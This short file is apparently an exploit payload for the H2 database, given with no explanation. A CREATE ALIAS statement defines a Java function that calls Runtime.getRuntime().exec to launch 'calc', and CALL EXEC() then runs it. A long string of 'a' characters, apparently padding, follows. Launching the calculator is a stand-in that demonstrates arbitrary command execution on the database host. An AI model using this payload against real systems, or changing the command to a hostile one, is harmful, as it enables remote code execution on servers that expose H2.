CREATE ALIAS EXEC AS $$
void shellexec() throws java.io.IOException {
    Runtime.getRuntime().exec("calc");
}
$$;
CALL EXEC();aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa